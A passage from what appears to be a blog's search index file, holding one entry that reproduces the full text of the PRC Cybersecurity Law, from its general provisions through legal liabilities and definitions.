  </entry>
  
  
  
  <entry>
    <title>望周知</title>
    <link href="/2022/04/11/%E6%9C%9B%E5%91%A8%E7%9F%A5/"/>
    <url>/2022/04/11/%E6%9C%9B%E5%91%A8%E7%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。</p><h2 id="法律全文"><a href="#法律全文" class="headerlink" title="法律全文"></a>法律全文</h2><h3 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章 总则"></a>第一章 总则</h3><p>第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h3 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h3><p>第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h3 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h3><p>第一节　一般规定</p><p>第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节　关键信息基础设施的运行安全</p><p>第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h3 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h3><p>第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h3 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h3><p>第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h3 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h3><p>第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p>第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>第六十九条　网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h3 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章 附则"></a>第七章 附则</h3><p>第七十六条　本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>第七十九条　本法自2017年6月1日起施行。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全法</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
